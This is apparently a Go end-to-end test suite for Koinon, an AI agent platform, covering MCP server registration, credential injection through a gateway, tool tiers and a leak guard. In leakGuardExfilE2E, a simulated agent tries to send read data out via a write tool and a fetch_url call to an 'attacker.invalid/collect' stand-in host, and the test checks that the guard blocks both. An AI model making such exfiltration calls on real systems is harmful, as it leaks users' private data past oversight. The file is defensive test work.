// SPDX-License-Identifier: Apache-2.0

package e2e_test

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/jackc/pgx/v5/pgtype"
	"github.com/modelcontextprotocol/go-sdk/mcp"
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/stateracloud/koinon/internal/execution"
	"github.com/stateracloud/koinon/internal/mcpguard"
	"github.com/stateracloud/koinon/internal/mcpservers"
	"github.com/stateracloud/koinon/test/e2e/e2eclient"
	"github.com/stateracloud/koinon/test/scenarios"
)

const (
	// The fake serves HTTPS (ADR 0120: Koinon sends a credential only over HTTPS). The server record carries
	// its CA (caBundle), which the gateway trusts for that server only.
	fakeMCPURL = "https://fakemcp.koinon-e2e-fakes.svc:8080/mcp"
	fakeMCPKey = "not-a-real-token"
)

type fakeMCPRecord struct {
	Method              string `json:"method"`
	Path                string `json:"path"`
	MCPMethod           string `json:"mcpMethod"`
	Authorized          bool   `json:"authorized"`
	Agent               string `json:"agent"`
	UserAgent           string `json:"userAgent"`
	ClientAuthorization bool   `json:"clientAuthorization"`
	Tool                string `json:"tool"`
	Args                string `json:"args"`
}

// fakeMCPClient is the client for the fake MCP server's /_fake endpoints. It trusts the CA the fake made
// at start (KOINON_E2E_FAKEMCP_CA, a public certificate that run.sh saved), and nothing else.
func fakeMCPClient() *http.Client {
	GinkgoHelper()
	caFile := os.Getenv("KOINON_E2E_FAKEMCP_CA")
	Expect(caFile).NotTo(BeEmpty(), "KOINON_E2E_FAKEMCP_CA")
	pem, err := os.ReadFile(caFile)
	Expect(err).NotTo(HaveOccurred())
	pool := x509.NewCertPool()
	Expect(pool.AppendCertsFromPEM(pem)).To(BeTrue(), "the fake MCP CA file holds no certificate")
	return &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{RootCAs: pool, MinVersion: tls.VersionTLS12}}}
}

// fakeMCPCA is the PEM of the CA that signed the fake MCP server's certificate: the server record's caBundle.
func fakeMCPCA() string {
	GinkgoHelper()
	caFile := os.Getenv("KOINON_E2E_FAKEMCP_CA")
	Expect(caFile).NotTo(BeEmpty(), "KOINON_E2E_FAKEMCP_CA")
	pem, err := os.ReadFile(caFile)
	Expect(err).NotTo(HaveOccurred())
	return string(pem)
}

func fakeMCPRequests(ctx context.Context, base string) []fakeMCPRecord {
	GinkgoHelper()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/_fake/requests", nil)
	Expect(err).NotTo(HaveOccurred())
	res, err := fakeMCPClient().Do(req)
	Expect(err).NotTo(HaveOccurred())
	defer func() { _ = res.Body.Close() }()
	var out []fakeMCPRecord
	Expect(json.NewDecoder(res.Body).Decode(&out)).To(Succeed())
	return out
}

type bearerTransport struct{ key string }

func (b bearerTransport) RoundTrip(r *http.Request) (*http.Response, error) {
	r = r.Clone(r.Context())
	r.Header.Set("Authorization", "Bearer "+b.key)
	return http.DefaultTransport.RoundTrip(r)
}

// mcpServerE2E registers the fake remote MCP server through the admin API and follows it through the
// whole path: refused OAuth server, probe through the real gateway (which injects the credential),
// tool sync into the ask tier, tiers, the agent's allowlist, and a tool call by the agent's own
// gateway key.
func mcpServerE2E(ctx context.Context, admin func(context.Context, string, string, ...string) (int, []byte), org, agentID string) string {
	GinkgoHelper()
	fake := strings.TrimRight(os.Getenv("KOINON_E2E_FAKEMCP_URL"), "/")
	kubectl := os.Getenv("KOINON_E2E_KUBECTL")
	Expect(fake).NotTo(BeEmpty(), "KOINON_E2E_FAKEMCP_URL")
	Expect(kubectl).NotTo(BeEmpty(), "KOINON_E2E_KUBECTL (a kubectl bound to the e2e cluster's context)")

	By("a server that asks each user to sign in is refused")
	code, body := admin(ctx, http.MethodPost, "/mcp-servers", `{"name":"oauthy","url":"http://fakemcp.koinon-e2e-fakes.svc:8081/oauth-mcp"}`)
	Expect(code).To(Equal(http.StatusBadRequest), string(body))
	Expect(string(body)).To(ContainSubstring("OAuth"))

	By("a server with a credential is added")
	code, body = admin(ctx, http.MethodPost, "/mcp-servers",
		fmt.Sprintf(`{"name":"tracker","url":%q,"credentialHeader":"X-Api-Key","credentialValue":%q,"caBundle":%q}`, fakeMCPURL, fakeMCPKey, fakeMCPCA()))
	Expect(code).To(Equal(http.StatusCreated), string(body))
	var srv struct {
		ID            string `json:"id"`
		HasCredential bool   `json:"hasCredential"`
	}
	Expect(json.Unmarshal(body, &srv)).To(Succeed())
	Expect(srv.HasCredential).To(BeTrue())
	Expect(string(body)).NotTo(ContainSubstring(fakeMCPKey))

	By("the reconciler serves it, the prober lists its tools through the gateway and marks it healthy")
	// A new credential reaches the gateway through the kubelet's Secret sync, then the config reloads.
	Eventually(func(g Gomega) {
		code, body := admin(ctx, http.MethodGet, "/mcp-servers/"+srv.ID)
		g.Expect(code).To(Equal(http.StatusOK), string(body))
		var s struct {
			Health, HealthReason string
			ToolsSyncedAt        *time.Time
		}
		g.Expect(json.Unmarshal(body, &s)).To(Succeed())
		g.Expect(s.Health).To(Equal("healthy"), s.HealthReason)
		g.Expect(s.ToolsSyncedAt).NotTo(BeNil())
	}).WithContext(ctx).WithTimeout(8 * time.Minute).WithPolling(5 * time.Second).Should(Succeed())

	code, body = admin(ctx, http.MethodGet, "/mcp-servers/"+srv.ID+"/tools")
	Expect(code).To(Equal(http.StatusOK), string(body))
	var tools struct {
		Tools []struct {
			Name         string `json:"name"`
			Tier         string `json:"tier"`
			ReadOnlyHint bool   `json:"readOnlyHint"`
			ContentHash  string `json:"contentHash"`
		} `json:"tools"`
	}
	Expect(json.Unmarshal(body, &tools)).To(Succeed())
	Expect(tools.Tools).To(ConsistOf(
		HaveField("Name", "read_item"), HaveField("Name", "write_item"), HaveField("Name", "fetch_url"), HaveField("Name", "search_items")))
	for _, tl := range tools.Tools {
		Expect(tl.Tier).To(Equal("ask"), "every new tool starts in the ask tier")
		Expect(tl.ReadOnlyHint).To(Equal(tl.Name == "read_item"))
	}

	By("the gateway injected the credential on everything it sent, and did not forward the prober's key")
	recs := fakeMCPRequests(ctx, fake)
	Expect(recs).NotTo(BeEmpty())
	anonymous := 0
	for _, r := range recs {
		if r.Path == "/oauth-mcp" {
			Expect(r.UserAgent).To(Equal(mcpservers.PreflightUserAgent), "only the add-time check asks the OAuth server: %+v", r)
		}
		if r.UserAgent == mcpservers.PreflightUserAgent {
			// koinon-api's add-time check (the refused "oauthy" server, and each added server): direct, it
			// carries no credential, and it does not go through the gateway. Its User-Agent tells it apart:
			// an empty agent header does not, because koinon-gateway sends none to an org's server (#1235).
			Expect(r.Authorized).To(BeFalse(), "the add-time check must not carry the credential: %+v", r)
			Expect(r.Agent).To(BeEmpty(), "the add-time check does not go through the gateway: %+v", r)
			anonymous++
			continue
		}
		Expect(r.Authorized).To(BeTrue(), "every request the gateway sent carried the credential: %+v", r)
		Expect(r.ClientAuthorization).To(BeFalse(), "the gateway's own key must not reach the server: %+v", r)
	}
	Expect(anonymous).To(BeNumerically(">=", 1), "the OAuth check reached the server anonymously")
	// The reconciler's probe lists the tools through koinon-gateway with driver koinon, and through
	// agentgateway with the fallback (#1239). Only agentgateway sends the probe agent's header (#1235).
	if probe := probeMCPPath(ctx, kubectl); probe.koinon {
		Expect(recs).To(HaveEach(HaveField("Agent", BeEmpty())),
			"koinon-gateway sends no agent header to an org's server, also not on the probe (#1235)")
		// The probe did run through koinon-gateway: the server is healthy with synced tools (above), and
		// before any agent call it saw a credentialed /mcp request, which is not the add-time check.
		Expect(recs).To(ContainElement(SatisfyAll(HaveField("Path", "/mcp"), HaveField("Authorized", true))),
			"the probe's requests through koinon-gateway")
	} else {
		Expect(recs).To(ContainElement(HaveField("Agent", "default/mcp-probe-tracker")))
	}

	By("a second server with insecureSkipVerify and no CA completes the real TLS handshake through the gateway")
	// The fake's certificate is signed by a per-run CA that is in no root store, so only the skipped
	// check lets the gateway's handshake pass; the prober's tool listing is a real call through it.
	code, body = admin(ctx, http.MethodPost, "/mcp-servers",
		fmt.Sprintf(`{"name":"scratch","url":%q,"credentialHeader":"X-Api-Key","credentialValue":%q,"insecureSkipVerify":true}`, fakeMCPURL, fakeMCPKey))
	Expect(code).To(Equal(http.StatusCreated), string(body))
	var scratch struct {
		ID string `json:"id"`
	}
	Expect(json.Unmarshal(body, &scratch)).To(Succeed())
	Eventually(func(g Gomega) {
		code, body := admin(ctx, http.MethodGet, "/mcp-servers/"+scratch.ID)
		g.Expect(code).To(Equal(http.StatusOK), string(body))
		var s struct {
			Health, HealthReason string
			ToolsSyncedAt        *time.Time
		}
		g.Expect(json.Unmarshal(body, &s)).To(Succeed())
		g.Expect(s.Health).To(Equal("healthy"), s.HealthReason)
		g.Expect(s.ToolsSyncedAt).NotTo(BeNil())
	}).WithContext(ctx).WithTimeout(8 * time.Minute).WithPolling(5 * time.Second).Should(Succeed())
	if probe := probeMCPPath(ctx, kubectl); probe.koinon {
		// koinon-gateway sends no agent header (#1235). The healthy server with synced tools shows the
		// probe's handshake passed; the fake also saw new credentialed /mcp requests from the gateway.
		Expect(len(credentialedMCP(fakeMCPRequests(ctx, fake)))).To(BeNumerically(">", len(credentialedMCP(recs))),
			"the scratch probe's requests through koinon-gateway")
	} else {
		Expect(fakeMCPRequests(ctx, fake)).To(ContainElement(HaveField("Agent", "default/mcp-probe-scratch")))
	}

	By("an admin confirms read_item as auto and write_item as ask, and allows the agent")
	setToolTierE2E(ctx, admin, srv.ID, "read_item", "auto")
	// A tool that no admin reviewed is hidden (ADR 0125), also on the approval proxy. Confirming
	// write_item at its ask tier reviews it, so the approval proxy serves it.
	setToolTierE2E(ctx, admin, srv.ID, "write_item", "ask")
	// read_item is a read-only lookup with no address arguments: declare its sink class as none so
	// the in-task call of step 6b is not external-high. Its result legs stay unset (the server's,
	// both), so the exfil case still holds. write_item stays undeclared (external-high). Step 4's
	// create_pull_request is Koinon's own tool and sets no leg (ADR 0091 decision 4).
	readItemHash := ""
	for _, tl := range tools.Tools {
		if tl.Name == "read_item" {
			readItemHash = tl.ContentHash
		}
	}
	Expect(readItemHash).NotTo(BeEmpty(), "read_item must be in the server's tool list: %+v", tools.Tools)
	code, body = admin(ctx, http.MethodPut, "/mcp-servers/"+srv.ID+"/tools/read_item/sink",
		fmt.Sprintf(`{"contentHash":%q,"sink":{"sinkClass":"none","derivation":"fixed","addressArgs":[]}}`, readItemHash))
	Expect(code).To(Equal(http.StatusOK), string(body))
	// search_items is the search-style tool of the leak guard's canary control (#1051): its query is free
	// text sent to an outside party, a small payload, so its class is fixed external-low. Its result legs
	// stay unset (the server's, both).
	searchHash := ""
	for _, tl := range tools.Tools {
		if tl.Name == "search_items" {
			searchHash = tl.ContentHash
		}
	}
	Expect(searchHash).NotTo(BeEmpty(), "search_items must be in the server's tool list: %+v", tools.Tools)
	code, body = admin(ctx, http.MethodPut, "/mcp-servers/"+srv.ID+"/tools/search_items/sink",
		fmt.Sprintf(`{"contentHash":%q,"sink":{"sinkClass":"external-low","derivation":"fixed","addressArgs":[]}}`, searchHash))
	Expect(code).To(Equal(http.StatusOK), string(body))
	code, body = admin(ctx, http.MethodPut, "/agents/"+agentID+"/mcp-servers", fmt.Sprintf(`{"servers":[{"serverId":%q}]}`, srv.ID))
	Expect(code).To(Equal(http.StatusOK), string(body))

	By("the agent's own gateway key sees read_item directly and write_item only behind approval")
	key := agentGatewayKey(ctx, kubectl, org, agentID)
	path := installMCPPath(ctx, kubectl)
	local := portForward(ctx, kubectl, path.service, path.port)
	client := mcp.NewClient(&mcp.Implementation{Name: "koinon-e2e", Version: "0"}, nil)
	var session *mcp.ClientSession
	var names []string
	Eventually(func(g Gomega) {
		s, err := client.Connect(ctx, &mcp.StreamableClientTransport{
			Endpoint: "http://" + local + "/mcp", HTTPClient: &http.Client{Transport: bearerTransport{key: key}},
			DisableStandaloneSSE: true, MaxRetries: -1,
		}, nil)
		g.Expect(err).NotTo(HaveOccurred())
		res, err := s.ListTools(ctx, nil)
		g.Expect(err).NotTo(HaveOccurred())
		names = names[:0]
		for _, tl := range res.Tools {
			names = append(names, tl.Name)
		}
		g.Expect(names).To(ContainElement(HaveSuffix("default-tracker_read_item")))
		g.Expect(names).To(ContainElement(HaveSuffix(scenarios.PullRequest.TrackerAskTool)))
		session = s
	}).WithContext(ctx).WithTimeout(3 * time.Minute).WithPolling(5 * time.Second).Should(Succeed())
	DeferCleanup(func() { _ = session.Close() })
	Expect(names).NotTo(ContainElement(HaveSuffix("default-tracker_write_item")), "an ask-tier tool is not on the server's own target")
	Expect(names).To(ContainElement(HaveSuffix(scenarios.PullRequest.TrackerAskTool)), "it is behind the approval proxy")

	By("a call to the auto tool goes through the gateway to the server, with the credential and the agent's identity")
	var read string
	for _, n := range names {
		if strings.HasSuffix(n, "default-tracker_read_item") {
			read = n
		}
	}
	res, err := session.CallTool(ctx, &mcp.CallToolParams{Name: read, Arguments: map[string]any{"title": "from the e2e"}})
	Expect(err).NotTo(HaveOccurred())
	Expect(res.IsError).To(BeFalse(), "the call failed; its content says why: %s", toolText(res))
	Expect(res.Content[0].(*mcp.TextContent).Text).To(ContainSubstring("read_item ok: from the e2e"))
	var called *fakeMCPRecord
	for _, r := range fakeMCPRequests(ctx, fake) {
		if r.Tool == "read_item" {
			called = &r
		}
	}
	Expect(called).NotTo(BeNil(), "the server saw the tool call")
	Expect(called.Agent).To(Equal(path.orgServerAgentHeader(agentID)), "the agent header on an org's server (#1235)")
	Expect(called.Authorized).To(BeTrue())

	leakGuardExfilE2E(ctx, admin, session, fake, srv.ID, agentID, key, res.Content[0].(*mcp.TextContent).Text)
	return srv.ID
}

// toolText is the text content of a tool result, for a failure message.
func toolText(res *mcp.CallToolResult) string {
	var b strings.Builder
	for _, c := range res.Content {
		if tc, ok := c.(*mcp.TextContent); ok {
			b.WriteString(tc.Text)
		}
	}
	return b.String()
}

// leakGuardExfilE2E is the exfiltration case of the MCP leak guard (ADR 0084, ADR 0091) on a full
// install: write_item is undeclared, so it is external-high, and read_item's result (its legs undeclared) sets
// both legs at the gateway (ADR 0091 decision 4). read_item's result above is a static stand-in for private data (the fake server answers the
// same text to every call); once the session holds it, the agent's attempt to send it out through an
// auto-tier tool of the same server must be stopped at the gateway by the guard, and never reach the
// server. The call is made outside a task, so the guard refuses it (an approval needs a run); inside
// a task the same call is an approval of the exact call (step 6b's in-task case, internal/mcpguard).
// write_item, fetch_url and search_items stay auto until the step ends: the in-task cases call them on the server's own target.
func leakGuardExfilE2E(ctx context.Context, admin func(context.Context, string, string, ...string) (int, []byte), session *mcp.ClientSession, fake, serverID, agentID, key, private string) {
	GinkgoHelper()
	By("with both legs, an external-high call carrying what the session read is stopped by the leak guard")
	// fetch_url, the fetch-style tool (its url argument names a destination), goes auto beside write_item.
	tools := []string{"write_item", "fetch_url", "search_items"}
	for _, t := range tools {
		setToolTierE2E(ctx, admin, serverID, t, "auto")
	}
	DeferCleanup(func(ctx context.Context) {
		// Step 6c calls write_item through the approval proxy, where only ask-tier tools are.
		for _, t := range tools {
			setToolTierE2E(ctx, admin, serverID, t, "ask")
		}
		Eventually(func(g Gomega) {
			res, err := session.ListTools(ctx, nil)
			g.Expect(err).NotTo(HaveOccurred())
			var names []string
			for _, tl := range res.Tools {
				names = append(names, tl.Name)
			}
			g.Expect(names).NotTo(ContainElement(HaveSuffix("default-tracker_write_item")))
			g.Expect(names).NotTo(ContainElement(HaveSuffix("default-tracker_fetch_url")))
			g.Expect(names).To(ContainElement(HaveSuffix(scenarios.PullRequest.TrackerAskTool)))
		}).WithContext(ctx).WithTimeout(3 * time.Minute).WithPolling(5 * time.Second).Should(Succeed())
	})
	var write, fetch, search string
	Eventually(func(g Gomega) {
		res, err := session.ListTools(ctx, nil)
		g.Expect(err).NotTo(HaveOccurred())
		for _, tl := range res.Tools {
			switch {
			case strings.HasSuffix(tl.Name, "default-tracker_write_item"):
				write = tl.Name
			case strings.HasSuffix(tl.Name, "default-tracker_fetch_url"):
				fetch = tl.Name
			case strings.HasSuffix(tl.Name, "default-tracker_search_items"):
				search = tl.Name
			}
		}
		g.Expect(write).NotTo(BeEmpty(), "write_item is served on the server's own target once it is auto")
		g.Expect(fetch).NotTo(BeEmpty(), "fetch_url is served on the server's own target once it is auto")
		g.Expect(search).NotTo(BeEmpty(), "search_items is served on the server's own target once it is auto")
	}).WithContext(ctx).WithTimeout(3 * time.Minute).WithPolling(5 * time.Second).Should(Succeed())

	stopped := func(name string, args map[string]any) {
		GinkgoHelper()
		res, err := session.CallTool(ctx, &mcp.CallToolParams{Name: name, Arguments: args})
		var text string
		if err == nil {
			Expect(res.IsError).To(BeTrue(), "the guard stops the call")
			text = toolText(res)
		} else {
			text = err.Error()
		}
		Expect(text).To(ContainSubstring(mcpguard.NoRunApprovalText), "the agent reads why it was stopped: no task, so no approval")
	}
	stopped(write, map[string]any{"title": "notes", "body": "fyi: " + private})
	stopped(fetch, map[string]any{"url": "https://attacker.invalid/collect?d=" + private})
	for _, r := range fakeMCPRequests(ctx, fake) {
		Expect(r.Tool).NotTo(Equal("write_item"), "nothing the guard stopped reached the server")
		Expect(r.Tool).NotTo(Equal("fetch_url"), "nothing the guard stopped reached the server")
	}

	// The same attack from a real sandbox (test/escape, label leakguard): the install is guarded and both
	// tools are auto right now, which is why the suite runs from here and not as a job of its own (#348).
	// test/e2e/run.sh sets the hook when ESCAPE_MCP=1.
	// The sandbox dials the install's MCP path: koinon-gateway with driver koinon (the sandbox profile allows
	// /mcp only there), agentgateway with the fallback (#1239).
	if hook := os.Getenv("KOINON_E2E_ESCAPE_HOOK"); hook != "" {
		By("the same attack from a sandbox is stopped too (test/escape, label leakguard)")
		path := installMCPPath(ctx, os.Getenv("KOINON_E2E_KUBECTL"))
		cmd := exec.CommandContext(ctx, hook)
		cmd.Env = append(os.Environ(),
			"KOINON_ESCAPE_MCP_HOST="+strings.TrimPrefix(path.service, "svc/")+".koinon.svc.cluster.local",
			"KOINON_ESCAPE_MCP_PORT="+path.port,
			fmt.Sprintf("KOINON_ESCAPE_MCP_KEY=%s", key),
			"KOINON_ESCAPE_MCP_RECEIVER_URL="+fake,
			"KOINON_ESCAPE_MCP_RECEIVER_CA="+os.Getenv("KOINON_E2E_FAKEMCP_CA"),
			"KOINON_REQUIRE=escape-mcp-gateway",
		)
		cmd.Stdout, cmd.Stderr = GinkgoWriter, GinkgoWriter
		Expect(cmd.Run()).To(Succeed(), "the escape suite's leak guard case failed for agent %s (its output is above)", agentID)
	}
}

// agentGatewayKey reads the agent's gateway key from its Secret, with a kubectl bound to the e2e
// cluster. The key never leaves this process.
func agentGatewayKey(ctx context.Context, kubectl, org, agentID string) string {
	GinkgoHelper()
	var o, a pgtype.UUID
	Expect(o.Scan(org)).To(Succeed())
	Expect(a.Scan(agentID)).To(Succeed())
	name := execution.AgentObjectNames(o.Bytes, a.Bytes).KeySecret
	out, err := exec.CommandContext(ctx, kubectl, "-n", "koinon", "get", "secret", name, "-o", "jsonpath={.data.api_key}").Output()
	Expect(err).NotTo(HaveOccurred())
	raw, err := base64.StdEncoding.DecodeString(string(out))
	Expect(err).NotTo(HaveOccurred())
	return string(raw)
}

// secretToken reads key "token" of a Secret in the koinon namespace, for the checks that one OTLP
// token does not admit the other's path. It never leaves this process.
func secretToken(ctx context.Context, kubectl, name string) string {
	GinkgoHelper()
	out, err := exec.CommandContext(ctx, kubectl, "-n", "koinon", "get", "secret", name, "-o", "jsonpath={.data.token}").Output()
	Expect(err).NotTo(HaveOccurred())
	raw, err := base64.StdEncoding.DecodeString(string(out))
	Expect(err).NotTo(HaveOccurred())
	Expect(raw).NotTo(BeEmpty(), name)
	return string(raw)
}

// mcpPath is one MCP path of this install (ADR 0097 decision 5): koinon-gateway (gateway.mcp.driver=koinon)
// or agentgateway, the fallback.
type mcpPath struct {
	koinon  bool
	service string
	port    string
}

// installMCPPath is the MCP path a client outside the cluster uses: koinon-gateway when the chart runs it
// (the koinon-mcp-gateway Deployment exists), else agentgateway. The port is read from the Service. With
// driver koinon, every step of mcpServerE2E (tool list, ask tier, leak guard) then runs on koinon-gateway.
func installMCPPath(ctx context.Context, kubectl string) mcpPath {
	GinkgoHelper()
	Expect(kubectl).NotTo(BeEmpty(), "KOINON_E2E_KUBECTL")
	out, err := exec.CommandContext(ctx, kubectl, "-n", "koinon", "get", "deployment", "--ignore-not-found",
		"koinon-mcp-gateway", "-o", "name").CombinedOutput()
	Expect(err).NotTo(HaveOccurred(), "kubectl get deployment koinon-mcp-gateway: %s", out)
	p := mcpPath{service: "svc/koinon-gateway"}
	if strings.TrimSpace(string(out)) != "" {
		p = mcpPath{koinon: true, service: "svc/koinon-mcp-gateway"}
	}
	out, err = exec.CommandContext(ctx, kubectl, "-n", "koinon", "get", p.service,
		"-o", `jsonpath={.spec.ports[?(@.name=="mcp")].port}{.spec.ports[?(@.name=="llm")].port}`).CombinedOutput()
	Expect(err).NotTo(HaveOccurred(), "kubectl get %s: %s", p.service, out)
	p.port = strings.TrimSpace(string(out))
	Expect(p.port).NotTo(BeEmpty(), "the MCP port of %s", p.service)
	return p
}

// agentMCPPath is the MCP path an agent in a sandbox uses. koinon-agentd gives the agent its MCP URL from
// its environment, so the path is koinon-gateway exactly when one of those values names the
// koinon-mcp-gateway Service: with driver koinon the chart sets KOINON_AGENT_MCP_URL to it (#1239).
func agentMCPPath(ctx context.Context, kubectl string) mcpPath {
	GinkgoHelper()
	Expect(kubectl).NotTo(BeEmpty(), "KOINON_E2E_KUBECTL")
	out, err := exec.CommandContext(ctx, kubectl, "-n", "koinon", "get", "deployment", "koinon-agentd",
		"-o", "jsonpath={.spec.template.spec.containers[*].env[*].value}").CombinedOutput()
	Expect(err).NotTo(HaveOccurred(), "kubectl get deployment koinon-agentd: %s", out)
	if strings.Contains(string(out), "koinon-mcp-gateway.") {
		return mcpPath{koinon: true}
	}
	return mcpPath{}
}

// probeMCPPath is the MCP path of the reconciler's tool probe: koinon-gateway when the reconciler's config
// names koinon-gateway's MCP listener (gateway.mcpUrl, set with driver koinon, #1239), else
// agentgateway.
func probeMCPPath(ctx context.Context, kubectl string) mcpPath {
	GinkgoHelper()
	Expect(kubectl).NotTo(BeEmpty(), "KOINON_E2E_KUBECTL")
	out, err := exec.CommandContext(ctx, kubectl, "-n", "koinon", "get", "configmap", "koinon-config",
		"-o", "jsonpath={.data}").CombinedOutput()
	Expect(err).NotTo(HaveOccurred(), "kubectl get configmap koinon-config: %s", out)
	Expect(strings.TrimSpace(string(out))).NotTo(BeEmpty(), "the data of configmap koinon-config")
	return mcpPath{koinon: strings.Contains(string(out), "mcpUrl: http://koinon-mcp-gateway.")}
}

// approvedCallMCPPath is the MCP path of a call a human approved: koinon-api makes it to
// KOINON_GATEWAY_MCP_URL, which names the koinon-mcp-gateway Service when the driver is koinon.
func approvedCallMCPPath(ctx context.Context, kubectl string) mcpPath {
	GinkgoHelper()
	Expect(kubectl).NotTo(BeEmpty(), "KOINON_E2E_KUBECTL")
	out, err := exec.CommandContext(ctx, kubectl, "-n", "koinon", "get", "deployment", "koinon-api", "-o",
		`jsonpath={.spec.template.spec.containers[*].env[?(@.name=="KOINON_GATEWAY_MCP_URL")].value}`).CombinedOutput()
	Expect(err).NotTo(HaveOccurred(), "kubectl get deployment koinon-api: %s", out)
	Expect(strings.TrimSpace(string(out))).NotTo(BeEmpty(), "KOINON_GATEWAY_MCP_URL of koinon-api")
	return mcpPath{koinon: strings.Contains(string(out), "koinon-mcp-gateway.")}
}

// orgServerAgentHeader is the agent header a server an org registered sees on this path (#1235). Koinon's
// MCP path never sends it, so the server sees none. The agentgateway render sets it on its one MCP route
// for every target until that path is deleted, so the server sees the agent.
func (p mcpPath) orgServerAgentHeader(agentID string) string {
	if p.koinon {
		return ""
	}
	return "default/" + agentID
}

// portForward forwards a free local port to target's port in the koinon namespace until the spec ends.
func portForward(ctx context.Context, kubectl, target, port string) string {
	GinkgoHelper()
	l, err := (&net.ListenConfig{}).Listen(ctx, "tcp", "127.0.0.1:0")
	Expect(err).NotTo(HaveOccurred())
	_, p, _ := net.SplitHostPort(l.Addr().String())
	Expect(l.Close()).To(Succeed())
	cmd := exec.CommandContext(context.WithoutCancel(ctx), kubectl, "-n", "koinon", "port-forward", target, p+":"+port)
	cmd.Stdout, cmd.Stderr = io.Discard, io.Discard
	Expect(cmd.Start()).To(Succeed())
	DeferCleanup(func() { _ = cmd.Process.Kill(); _ = cmd.Wait() })
	addr := "127.0.0.1:" + p
	Eventually(func() error {
		c, err := (&net.Dialer{Timeout: time.Second}).DialContext(ctx, "tcp", addr)
		if err == nil {
			_ = c.Close()
		}
		return err
	}).WithContext(ctx).WithTimeout(30 * time.Second).WithPolling(500 * time.Millisecond).Should(Succeed())
	return addr
}

// setToolSinkE2E declares a tool's sink as the console does: it reads the tool's content hash first and
// sends it with the declaration (sink is the JSON of the declaration).
func setToolSinkE2E(ctx context.Context, admin func(context.Context, string, string, ...string) (int, []byte), serverID, tool, sink string) {
	GinkgoHelper()
	code, body := admin(ctx, http.MethodGet, "/mcp-servers/"+serverID+"/tools")
	Expect(code).To(Equal(http.StatusOK), string(body))
	var list struct {
		Tools []struct {
			Name        string `json:"name"`
			ContentHash string `json:"contentHash"`
		} `json:"tools"`
	}
	Expect(json.Unmarshal(body, &list)).To(Succeed())
	hash := ""
	for _, t := range list.Tools {
		if t.Name == tool {
			hash = t.ContentHash
		}
	}
	Expect(hash).NotTo(BeEmpty(), "%s must be in the server's tool list: %s", tool, body)
	code, body = admin(ctx, http.MethodPut, "/mcp-servers/"+serverID+"/tools/"+tool+"/sink", fmt.Sprintf(`{"contentHash":%q,"sink":%s}`, hash, sink))
	Expect(code).To(Equal(http.StatusOK), string(body))
}

// guardDecisions reads koinon_api_mcp_guard_decisions_total for one decision, reason and sink class from
// the processes that run the leak guard on the agent's MCP path. The counter has fixed labels (ADR 0023),
// so the e2e compares it before and after a task.
func guardDecisions(ctx context.Context, kubectl, decision, reason, sinkClass string) float64 {
	GinkgoHelper()
	n, found := guardDecisionsMatching(ctx, kubectl, regexp.QuoteMeta(decision), regexp.QuoteMeta(reason), regexp.QuoteMeta(sinkClass))
	Expect(found).To(BeTrue(), "the guard's processes export its decisions for %s/%s/%s", decision, reason, sinkClass)
	return n
}

// guardDecisionsMatching sums koinon_api_mcp_guard_decisions_total over every series whose decision, reason
// and sink class match the three regular expressions, from the processes that run the leak guard on the
// agent's MCP path. found is false when no target exports a matching series.
func guardDecisionsMatching(ctx context.Context, kubectl, decision, reason, sinkClass string) (sum float64, found bool) {
	GinkgoHelper()
	// The guard counts its decisions in the process that runs it: koinon-api behind agentgateway, and
	// each koinon-mcp-gateway pod with driver koinon (#1239). A call goes to one pod, so the sum counts it once.
	targets := []string{"deploy/koinon-api"}
	port := "9090"
	if agentMCPPath(ctx, kubectl).koinon {
		out, err := exec.CommandContext(ctx, kubectl, "-n", "koinon", "get", "pods", "-l", "app.kubernetes.io/component=mcp-gateway",
			"--field-selector=status.phase=Running", "-o", "name").CombinedOutput()
		Expect(err).NotTo(HaveOccurred(), "kubectl get pods koinon-mcp-gateway: %s", out)
		targets = strings.Fields(string(out))
		Expect(targets).NotTo(BeEmpty(), "a running koinon-mcp-gateway pod")
		port = "15020"
	}
	re := regexp.MustCompile(`(?m)^koinon_api_mcp_guard_decisions_total\{decision="(?:` + decision +
		`)",reason="(?:` + reason + `)",sink_class="(?:` + sinkClass + `)"\} (\S+)$`)
	for _, t := range targets {
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, "http://"+portForward(ctx, kubectl, t, port)+"/metrics", nil)
		Expect(err).NotTo(HaveOccurred())
		res, err := http.DefaultClient.Do(req)
		Expect(err).NotTo(HaveOccurred())
		b, err := io.ReadAll(res.Body)
		_ = res.Body.Close()
		Expect(err).NotTo(HaveOccurred())
		for _, m := range re.FindAllSubmatch(b, -1) {
			n, err := strconv.ParseFloat(string(m[1]), 64)
			Expect(err).NotTo(HaveOccurred())
			sum, found = sum+n, true
		}
	}
	return sum, found
}

// setToolTierE2E sets a tool's tier as the console does (e2eclient.SetToolTier): an unreviewed tool stays
// hidden until an admin reviews it (ADR 0125).
func setToolTierE2E(ctx context.Context, admin func(context.Context, string, string, ...string) (int, []byte), serverID, tool, tier string) {
	GinkgoHelper()
	err := e2eclient.SetToolTier(ctx, func(ctx context.Context, method, path string, body ...string) (int, []byte, error) {
		code, b := admin(ctx, method, path, body...)
		return code, b, nil
	}, serverID, tool, tier)
	Expect(err).NotTo(HaveOccurred())
}

// credentialedMCP returns the /mcp requests that carried the credential and are not the add-time check.
func credentialedMCP(recs []fakeMCPRecord) []fakeMCPRecord {
	var out []fakeMCPRecord
	for _, r := range recs {
		if r.Path == "/mcp" && r.Authorized && r.UserAgent != mcpservers.PreflightUserAgent {
			out = append(out, r)
		}
	}
	return out
}
